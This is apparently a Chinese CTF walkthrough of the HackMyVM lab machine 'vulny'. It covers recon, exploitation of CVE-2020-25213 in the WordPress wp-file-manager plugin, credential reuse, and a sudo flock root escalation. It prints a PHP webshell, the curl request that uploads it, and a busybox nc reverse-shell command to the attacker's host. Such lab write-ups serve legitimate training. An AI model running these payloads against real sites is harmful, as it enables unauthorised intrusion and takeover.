## 信息收集

### 主机发现

使用 arp-scan 扫描本地网络，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
192.168.205.236 08:00:27:8c:04:d7       PCS Systemtechnik GmbH
```

目标 IP 为 `192.168.205.236`，MAC 地址显示为 Oracle VirtualBox 虚拟机。

### 端口扫描

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.236
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-04 23:58 -0400
Nmap scan report for 192.168.205.236
Host is up (0.00042s latency).
Not shown: 65534 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
MAC Address: 08:00:27:8C:04:D7 (Oracle VirtualBox virtual NIC)
```

开放端口：

- 80/tcp — HTTP（Apache）
- 33060/tcp — MySQL X Protocol

没有 SSH 服务，提权后的交互只能通过反弹 shell 完成。

## Web 渗透

### 80 端口初探

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.236
```

返回 Apache2 Ubuntu Default Page，说明 Web 根目录是默认页面，需要发现隐藏路径。

### 目录扫描

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u 192.168.205.236
[23:58:56] 301 -  319B  - http://192.168.205.236/secret  ->  http://192.168.205.236/secret/
```

发现 `/secret/` 目录。

### WordPress 识别

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.236/secret/
Neither <b>/etc/wordpress/config-192.168.205.236.php</b> nor <b>/etc/wordpress/config-168.205.236.php</b> could be found.
```

报错信息暴露了 WordPress 的配置加载逻辑。WordPress 安装在 `/secret/` 下，但因为缺少匹配当前 IP 的配置文件所以无法正常运行。

对 `/secret/` 继续扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u http://192.168.205.236/secret/
[23:59:55] 200 -  514B  - http://192.168.205.236/secret/wp-content/
[23:59:55] 200 -  488B  - http://192.168.205.236/secret/wp-content/uploads/
```

目录列表开启，可以浏览 `wp-content` 结构。

### 插件枚举

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.236/secret/wp-content/plugins/
```

发现安装了 `wp-file-manager` 插件。

uploads 目录中还保留了插件安装包：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.236/secret/wp-content/uploads/2020/10/
wp-file-manager-6.O.zip   2020-10-15 11:02  3.5M
```

版本为 6.0。

### 漏洞确认

使用 nuclei 进行漏洞扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.236/secret/
[CVE-2020-25213] [http] [critical] http://192.168.205.236/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
[wordpress-wp-file-manager:outdated_version] [http] [info] ["6.0"]
```

确认存在 CVE-2020-25213，这是 wp-file-manager 插件 6.9 之前版本的严重漏洞。插件将 elFinder 的示例连接器文件重命名为 `.php` 后缀并暴露在公网，允许未认证用户上传和执行任意 PHP 代码。

> https://www.cve.org/CVERecord?id=CVE-2020-25213

## 漏洞利用 — CVE-2020-25213

### 验证连接器可达

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.236/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
{"error":["errUnknownCmd"]}
```

连接器存活，返回 elFinder JSON 格式错误（因为没传有效命令）。

### 上传 Webshell

准备一个PHP webshell（`cmd.php`），通过 elFinder 的 upload 命令上传：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat cmd.php                                                                     
GIF89a;
<?php 
if(isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    $a($b);
}
?>
<?php phpinfo(); ?>

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s -F 'cmd=upload' -F 'target=l1_' -F 'upload[]=@cmd.php' \
  http://192.168.205.236/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
{"added":[{"name":"cmd.php","url":"\/secret\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/cmd.php"...}]...}
```

上传成功，文件被存储到 `lib/files/cmd.php`。

### 验证代码执行

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.236/secret/wp-content/plugins/wp-file-manager/lib/files/cmd.php?a=system&b=id'
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

以 `www-data` 身份获得了命令执行能力。

## 反弹 Shell

在 Kali 上启动监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ penelope -p 8888
[+] Listening for reverse shells on 0.0.0.0:8888
```

通过 webshell 触发反弹 shell：

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.205.236/secret/wp-content/plugins/wp-file-manager/lib/files/cmd.php?a=system&b=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fbash'
```

获得交互式 PTY shell：

```bash
[+] [New Reverse Shell] => vulny 192.168.205.236 Linux-x86_64 👤 www-data(33)
[+] PTY upgrade successful via /usr/bin/python3
www-data@vulny:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 横向移动 — www-data → adrian

### WordPress 配置文件泄露

```bash
www-data@vulny:$ find / -name 'wordpress' 2>/dev/null
/etc/wordpress
/usr/share/wordpress
...

www-data@vulny:$ ls /etc/wordpress/
config-192.168.1.122.php  htaccess

www-data@vulny:$ cat /etc/wordpress/config-192.168.1.122.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'myfuckingpassword');
define('DB_HOST', 'localhost');
...
```

数据库密码为 `myfuckingpassword`。

查看 WordPress 主配置 `/usr/share/wordpress/wp-config.php` 时发现一段注释：

```php
/* idrinksomewater */
```

这看起来像是故意留下的口令提示。

### 枚举系统用户

```bash
www-data@vulny:$ ls /home/
adrian
```

系统上只有一个普通用户 `adrian`。

### 密码复用

尝试用 `wp-config.php` 中的注释 `idrinksomewater` 作为密码切换到 adrian：

```bash
www-data@vulny:$ su adrian
Password: idrinksomewater
adrian@vulny:$
```

成功切换。

### User Flag

```bash
adrian@vulny:~$ cat /home/adrian/user.txt
HMViuploadfiles
```

## 权限提升 — adrian → root

### sudo 枚举

```bash
adrian@vulny:~$ sudo -l
User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
```

`adrian` 可以无密码以 root 身份执行 `/usr/bin/flock`。

### flock 提权

`flock` 是文件锁工具，但它可以在获取锁后执行任意命令。根据 [GTFOBins](https://gtfobins.github.io/gtfobins/flock/)，利用方式如下：

```bash
adrian@vulny:~$ sudo /usr/bin/flock -u /tmp/lockfile /bin/bash -p
root@vulny:# id
uid=0(root) gid=0(root) groups=0(root)
```

`-u` 参数表示释放锁后继续执行后续命令，`/bin/bash -p` 以特权模式启动 bash，获得 root shell。

### Root Flag

```bash
root@vulny:# cat /root/root.txt
HMVididit
```